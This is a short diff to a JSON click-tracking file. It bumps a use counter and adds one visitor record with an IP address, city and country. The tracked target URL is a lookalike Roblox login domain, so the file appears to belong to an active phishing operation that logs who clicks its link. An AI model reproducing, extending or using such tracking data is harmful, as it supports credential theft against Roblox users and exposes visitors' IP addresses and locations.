@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1130,
+    "useCount": 1131,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9184,6 +9184,14 @@
         "city": "Los Angeles",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777276449815,
+        "ip": "117.5.146.64",
+        "country": "Vietnam",
+        "city": "Hanoi",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
